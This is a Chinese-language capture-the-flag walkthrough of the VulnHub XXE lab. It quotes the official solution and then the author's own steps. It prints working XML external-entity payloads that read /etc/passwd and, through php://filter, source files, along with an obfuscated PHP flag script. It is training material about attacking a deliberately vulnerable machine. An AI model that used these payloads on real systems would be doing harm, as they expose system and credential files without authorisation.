# 下载地址

    
    
    https://download.vulnhub.com/xxe/XXE.zip  
    

# 实战演练

下载完成之后，发现文件夹里面有个Walkthrough.txt =-=

    
    
    1: access the VM ip on port 80.
    --------------------------------------------------    2: by checking (robots.txt) we can see there is a (xxe) folder and admin.php be sure the admin.php not in the web root and try it in the xxe folder.
    --------------------------------------------------    3: IP/xxe will show a login page that has been vulnerable to Xml Xternal Entity(XXE).
    --------------------------------------------------    4: submit the form and intercept it will show an xml post.
    --------------------------------------------------    5: edit xml tags to test xxe
    <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY sp SYSTEM "file:///etc/passwd">
    ]>
    <root><name>&ampsp</name><password>hj</password></root>
    (it will show (/etc/passwd)
    --------------------------------------------------    6: change file:///etc/passwd to read admin.php content
    <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php">
    ]>
    <root><name>&ampsp</name><password>hj</password></root>
    --------------------------------------------------    7: we now got the content encoded to base64 after decode it we got this line
                   if ($_POST['username'] == 'administhebest' && 
                      md5($_POST['password']) == 'e6e061838856bf47e1de730719fb2609') {
    user name and password decrypt the pass using google will show (admin@123).
    --------------------------------------------------    8: administhebest:admin@123 we login as admin it will let you access the admin.php and show us flag with hyperLink to flagmeout.php -> in the same folder but the code send us to web root lets test /xxe/flagmeout.php it will open and by source view can see a comment says ( <!-- the flag in (JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5) --> )
    --------------------------------------------------    9: decode JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5 using Base32 (http://www.simplycalc.com/base32-decode.php) we get a Base64 we decoded it ( /etc/.flag.php )
    --------------------------------------------------    10: access the file (/etc/.flag.php)
    <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/.flag.php">
    ]>
    <root><name>&ampsp</name><password>hj</password></root>
    
    or simply without php://filter (<!ENTITY sp SYSTEM "/etc/.flag.php">) we got the code.
    --------------------------------------------------    11: decode Base64 will show phpnonalpha2 code save it in your computer .e.g flag.php (make sure to add <?php and ?> to the code because it is php.
    --------------------------------------------------    12: open terminal and type (php flag.php) will show error in the code but last line will show a flag says (SAFCSP{xxe_is_so_easy}).
      
    

我按照自己的流程走吧，到时不懂再回来吧

获取靶机的IP

![image.png](https://image.3001.net/images/20191126/1574777394_5ddd3232d7d9a.png)扫描IP开放了那些端口

![image.png](https://image.3001.net/images/20191126/1574777419_5ddd324b1b5d2.png)浏览器打开80端口，这是一个默认的页面

![image.png](https://image.3001.net/images/20191126/1574777447_5ddd3267707c1.png)爆破一下web目录

![image.png](https://image.3001.net/images/20191126/1574777541_5ddd32c557c0c.png)打开robots文件，发现隐藏了两个目录

![image.png](https://image.3001.net/images/20191126/1574777570_5ddd32e2ce60c.png)进入到一个登录页面

![image.png](https://image.3001.net/images/20191126/1574777624_5ddd33184dff5.png)使用bp进行抓包，发现post内容是xml，这应该就是xxe漏洞的地方

![image.png](https://image.3001.net/images/20191126/1574777792_5ddd33c05d592.png)![image.png](https://image.3001.net/images/20191126/1574778840_5ddd37d88047d.png)  

由于对xml的语法不熟，平时也用不到xml，下面就直接用官方提供的payload测试吧

    
    
    <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY sp SYSTEM "file:///etc/passwd">
    ]>
    <root><name>&ampsp</name><password>hj</password></root>
    

![image.png](https://image.3001.net/images/20191126/1574778076_5ddd34dc96375.png)获取admin.php的源代码

    
    
    <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php">
    ]>
    <root><name>&ampsp</name><password>hj</password></root>
    

![image.png](https://image.3001.net/images/20191126/1574778121_5ddd3509609e2.png)

base64解密![image.png](https://image.3001.net/images/20191126/1574778230_5ddd357685bba.png)登陆密码

![image.png](https://image.3001.net/images/20191126/1574778272_5ddd35a0b138e.png)不过这里就出现了一个问题，我无法登录成功，官方文档说可以登录成功的。

换个思路，我们从源代码发现了一个php页面

![image.png](https://image.3001.net/images/20191126/1574779031_5ddd389773ff2.png)看看里面的内容，找到了flag信息，JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5

![image.png](https://image.3001.net/images/20191126/1574779161_5ddd391913c20.png)按照提示base32解密

![image.png](https://image.3001.net/images/20191126/1574779282_5ddd399219fb0.png)再base64解密

![image.png](https://image.3001.net/images/20191126/1574779324_5ddd39bc73a6c.png)找到了flag位置，用了作者的payload，发现不行，后来用了第一个就可以

![image.png](https://image.3001.net/images/20191126/1574779774_5ddd3b7e213d0.png)

    
    
    <?php 
    $_[]++;
    $_[]=$_._;
    $_____=$_[(++$__[])][(++$__[])+(++$__[])+(++$__[])];
    $_=$_[$_[+_]];
    $___=$__=$_[++$__[]];
    $____=$_=$_[+_];
    $_++;
    $_++;
    $_++;
    $_=$____.++$___.$___.++$_.$__.++$___;
    $__=$_;
    $_=$_____;
    $_++;
    $_++;
    $_++;
    $_++;
    $_++;
    $_++;
    $_++;
    $_++;
    $_++;
    $_++;
    $___=+_;
    $___.=$__;
    $___=++$_^$___[+_];
    $À=+_;
    $Á=$Â=$Ã=$Ä=$Æ=$È=$É=$Ê=$Ë=++$Á[];
    $Â++;
    $Ã++;
    $Ã++;
    $Ä++;
    $Ä++;
    $Ä++;
    $Æ++;
    $Æ++;
    $Æ++;
    $Æ++;
    $È++;
    $È++;
    $È++;
    $È++;
    $È++;
    $É++;
    $É++;
    $É++;
    $É++;
    $É++;
    $É++;
    $Ê++;
    $Ê++;
    $Ê++;
    $Ê++;
    $Ê++;
    $Ê++;
    $Ê++;
    $Ë++;
    $Ë++;
    $Ë++;
    $Ë++;
    $Ë++;
    $Ë++;
    $Ë++;
    $__('$_="'.$___.$Á.$Â.$Ã.$___.$Á.$À.$Á.$___.$Á.$À.$È.$___.$Á.$À.$Ã.$___.$Á.$Â.$Ã.$___.$Á.$Â.$À.$___.$Á.$É.$Ã.$___.$Á.$É.$À.$___.$Á.$É.$À.$___.$Á.$Ä.$Æ.$___.$Á.$Ã.$É.$___.$Á.$Æ.$Á.$___.$Á.$È.$Ã.$___.$Á.$Ã.$É.$___.$Á.$È.$Ã.$___.$Á.$Æ.$É.$___.$Á.$Ã.$É.$___.$Á.$Ä.$Æ.$___.$Á.$Ä.$Á.$___.$Á.$È.$Ã.$___.$Á.$É.$Á.$___.$Á.$É.$Æ.'"');
    $__($_);
    ?>

可能是kali的php版本问题，我找了一个ubuntu16可以得到flag

![image.png](https://image.3001.net/images/20191126/1574780791_5ddd3f7774f32.png)  

